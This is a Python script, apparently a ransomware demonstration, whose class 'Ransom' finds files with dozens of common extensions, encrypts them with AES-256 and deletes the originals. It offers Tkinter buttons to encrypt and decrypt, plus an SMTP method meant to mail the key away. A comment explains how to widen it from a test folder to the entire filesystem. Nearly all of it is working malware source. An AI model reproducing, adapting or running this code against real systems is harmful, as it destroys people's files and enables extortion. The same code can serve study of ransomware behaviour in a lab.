#!/usr/bin/python
#@ credit to Eli Bendersky's website

from os import walk
import os, struct
from Crypto.Cipher import AES
from Crypto import Random
import sys
import tkinter
import smtplib



path=os.path.abspath(os.sep)
#comment next line to encrypted all file in system
path +='test_ground/'
#all files with such extension can be encrypted
extension=["3g2", "3gp", "asf", "asx", "avi", "flv","m2ts", "mkv", "mov", "mp4", "mpg", "mpeg","rm", "swf", "vob", "wmv", "doc", "docx", "pdf","rar","jpg", "jpeg", "png", "tiff", "zip", "7z", "exe", "targz", "tar", "mp3", "sh", "c", "cpp", "h", "gif", "txt", "py", "pyc", "jar", "sql", "bundle","sqlite3", "html", "php", "log", "bak", "deb"]

class Ransom():
    ''
    key = Random.get_random_bytes(32)
    #you can use send mail to send key to your mail account
    #send_mail()
    #for easy test, we store key in a local file called key.txt
    f = open("key.txt","wb")
    f.write(key)
    f.close()
    def encrypt_file(in_filename, out_filename=None, chunksize=64*1024):
        '''
        This method is used to encrypted file with AES-256 algorithm
        '''
        if not out_filename:
            out_filename = in_filename + '.enc'

        iv = Random.get_random_bytes(16)
        
        encryptor = AES.new(Ransom.key, AES.MODE_CBC, iv)
        filesize = os.path.getsize(in_filename)

        with open(in_filename, 'rb') as infile:
            with open(out_filename, 'wb') as outfile:
                outfile.write(struct.pack('<Q', filesize))
                outfile.write(iv)

                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk) == 0:
                        break
                    elif len(chunk) % 16 != 0:
                        chunk += b' ' * (16 - len(chunk) % 16)

                    outfile.write(encryptor.encrypt(chunk))
        infile.close()
        os.remove(in_filename)

    def lookfor_files(mypath, type):
        '''
        This method is used to search for all important files in systems
        '''
        f = []
        if(type=='enc'):
            for (dirpath, dirnames, filenames) in walk(mypath):
                for files in filenames:
                    if files.lower().split(".")[-1] in extension:
                        p = os.path.abspath(os.path.join(dirpath,files))
                        f.append(p)
        else:
            for (dirpath, dirnames, filenames) in walk(mypath):
                for files in filenames:
                    if (files.lower().split(".")[-1]=='enc'):
                        p = os.path.abspath(os.path.join(dirpath,files))
                        f.append(p)
        return set(f)

    def decryt_files(in_filename, out_filename=None, chunksize=64*1024):
        '''
        This method is used to decrypt files. To use this function, you have to restore
        key somewhere
        '''
        if not out_filename:
            out_filename = os.path.splitext(in_filename)[0]
        f = open("key.txt","rb")
        key = f.read()
        with open(in_filename,'rb') as infile:
            origsize = struct.unpack('<Q',infile.read(struct.calcsize('Q')))[0]
            iv = infile.read(16)
            decryptor = AES.new(key,AES.MODE_CBC,iv)

            with open(out_filename,'wb') as outfile:
                while True:
                    chunk = infile.read(chunksize)
                    if len(chunk)== 0:
                        break
                    outfile.write(decryptor.decrypt(chunk))


                outfile.truncate(origsize)
            infile.close()
            os.remove(in_filename)


    def encrypt_button():
        '''
        simple tinker gui used for test
        '''
        filenames = ()
        filenames = Ransom.lookfor_files(path,'enc')
        print(filenames)
        for f in filenames:
            Ransom.encrypt_file(f)

    def decrypt_button():
        '''
        simple tinker gui used for test
        '''
        filenames = ()
        filenames = Ransom.lookfor_files(path,'dec')
        for f in filenames:
            Ransom.decryt_files(f)
    def sendemail(self, to_addr_list, cc_addr_list,subject,from_addr, message):
        '''
        This method can use smtp protocol to send key to some mail address
        '''
        if message!="":
            initials = "XL"
            header  = 'From: %s\n' % from_addr
            header += 'To: %s\n' %','.join(to_addr_list)
            header += 'Cc: %s\n' % ','.join(cc_addr_list)
            header += 'Subject: %s\n\n' % subject
            message = Ransom.key
            server = smtplib.SMTP()
            server.connect()
            server.sendmail("\"key \("+initials+"\)\" ", to_addr_list, message)
            server.close()


if __name__ == "__main__":
    top = tkinter.Tk()
    E = tkinter.Button(top,text='enc',command = Ransom.encrypt_button,height=10,width=10)
    E.pack()
    D = tkinter.Button(top,text='dec',command = Ransom.decrypt_button,height=10,width=10)
    D.pack()
    top.geometry('500x500')
    top.mainloop()

